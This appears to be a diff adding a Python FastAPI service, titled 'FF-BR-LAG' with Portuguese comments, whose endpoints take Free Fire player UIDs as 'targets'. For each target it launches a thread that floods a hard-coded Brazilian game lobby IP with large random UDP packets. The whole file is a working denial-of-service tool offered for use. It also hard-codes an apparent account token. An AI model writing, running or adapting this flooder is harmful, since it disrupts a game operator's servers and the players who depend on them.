@@ -1,0 +1,61 @@
+# api.py
+import os, asyncio, random, socket, threading, time, json
+from fastapi import FastAPI, HTTPException
+from pydantic import BaseModel
+
+# ---------- CONFIG ----------
+FF_UID      = "4180303838"
+FF_AUTH     = "57F94F590ABD64C5BCA111172E04D2F37F8C8B4F9B5C3BE0E48D7DE792CFEF85"
+FF_ENDPOINT = "br-logic.garena.game"
+PACKET_SIZE = 65500
+MAX_THREADS = 256
+PPS         = 1000
+LOBBY_IP    = "103.26.68.110"   # IP lobby BR (pode mudar)
+# ----------------------------
+
+app = FastAPI(title="FF-BR-LAG", version="1.0")
+
+targets = set()
+
+class UID(BaseModel):
+    uid: str
+
+# ---------- UTIL ----------
+def udp_flood(target_uid: str):
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    data = os.urandom(PACKET_SIZE)
+    while target_uid in targets:
+        for _ in range(MAX_THREADS):
+            sock.sendto(data, (LOBBY_IP, 10051))
+        time.sleep(1 / PPS)
+
+# ---------- ROTAS ----------
+@app.get("/")
+def root():
+    return {
+        "/start": "Lista de comandos e uso",
+        "/add":   "POST {'uid':'12345678'} -> adiciona alvo",
+        "/stop":  "POST {'uid':'12345678'} -> remove alvo",
+        "/status":"GET -> UIDs ativos"
+    }
+
+@app.post("/add")
+def add(payload: UID):
+    uid = payload.uid
+    if uid in targets:
+        raise HTTPException(400, "UID já ativo")
+    targets.add(uid)
+    threading.Thread(target=udp_flood, args=(uid,), daemon=True).start()
+    return {"ok": True, "msg": "alvo adicionado"}
+
+@app.post("/stop")
+def stop(payload: UID):
+    uid = payload.uid
+    if uid not in targets:
+        raise HTTPException(404, "UID não encontrado")
+    targets.discard(uid)
+    return {"ok": True, "msg": "alvo removido"}
+
+@app.get("/status")
+def status():
+    return {"active": list(targets)}
